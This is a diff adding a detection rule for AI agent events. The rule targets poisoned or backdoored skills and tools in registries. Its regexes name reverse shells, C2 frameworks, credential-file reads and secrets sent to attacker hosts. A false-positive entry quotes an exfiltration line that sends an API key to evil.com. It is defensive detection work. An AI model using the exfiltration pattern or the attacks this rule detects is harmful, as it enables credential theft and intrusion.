@@ -1,0 +1,44 @@
+title: Skill Registry Poisoning and Compromised Tool Distribution
+id: 452b422b-ca0a-40ae-94fb-79ae9372c504
+status: experimental
+level: critical
+description: |-
+  Detects supply chain attacks that target skill/tool registries and distribution channels. Attackers compromise legitimate tool packages, inject backdoors into published skills, or create typosquatting tool names to distribute poisoned tools that execute malicious actions when installed or invoked by agents.
+
+  Adapted from Agent Threat Rules ATR-2026-00096 (MIT).
+author: ATR Community (adapted)
+date: '2026-03-11'
+references:
+- https://agentthreatrule.org/en/rules/ATR-2026-00096
+tags:
+- attack.execution
+- atlas.aml.t0010.005
+- atlas.aml.t0056
+- owasp.asi05
+- owasp.llm06
+logsource:
+  product: ai_agent
+  category: agent_events
+detection:
+  sel_0:
+    response|re: (?i)(post_?install|pre_?install|setup\.py|__init__\.py)\s*.{0,30}(exec|eval|os\.|subprocess|import\s+socket|import\s+requests\.post)
+  sel_1:
+    response|re: (?i)\b(reverse.?shell|bind.?shell|meterpreter|cobalt.?strike|c2.?server|command.?and.?control|beacon\s+(implant|payload|stager|config|dll)|(c2|malware|stager|implant|strike)\s+beacon)\b
+  sel_2:
+    response|re: (?i)(\bSocket\s*\(|net\.connect|new\s+WebSocket|XMLHttpRequest|fetch\s*\()\s*.{0,30}(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|attacker|evil|malicious|\bc2\b|ngrok)
+  sel_3:
+    response|re: (?i)((process\.env|os\.environ|System\.getenv|ENV\[).{0,16}(API.?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE.?KEY).{0,60}(attacker|evil|malicious|exfil|\bc2\b|webhook\.site|ngrok|pastebin|\.onion|requestbin|burpcollab|\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)|(attacker|evil|malicious|exfil|\bc2\b|webhook\.site|ngrok|pastebin|\.onion|requestbin|burpcollab|\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b).{0,60}(process\.env|os\.environ|System\.getenv|ENV\[).{0,16}(API.?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE.?KEY)|(process\.env|os\.environ|System\.getenv|ENV\[).{0,16}(API.?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE.?KEY).{0,60}(fetch\s*\(|requests\.(post|put)|axios\.(post|put)|XMLHttpRequest|sendBeacon|\bcurl\b|\bwget\b|urlopen))
+  sel_4:
+    response|re: (?i)\b(fs\.read|open\s*\(|File\.read|readFile)\s*.{0,30}(\.ssh|id_rsa|\.aws|credentials|\.env\b|/etc/shadow|/etc/passwd|secrets?\.)
+  condition: 1 of sel_*
+falsepositives:
+- Legitimate security audit tools that check for credential exposure
+- Security scanning tools that report findings containing references to credential file paths like .ssh/id_rsa
+  or .env in their vulnerability assessment output
+- Defensive security documentation that quotes a complete exfiltration example verbatim (for instance
+  a skill that teaches detection and prints fetch('https://evil.com/?key=' + process.env.API_KEY) as the
+  pattern to look for). This shape is indistinguishable from the attack by pattern matching alone and
+  is the residual false-positive class after the 2026-08-04 tightening.
+- Penetration-testing and red-team skills whose prose legitimately names malware and C2 tooling (meterpreter,
+  Cobalt Strike, reverse shell, command and control) as subject matter rather than as payload
+action: report
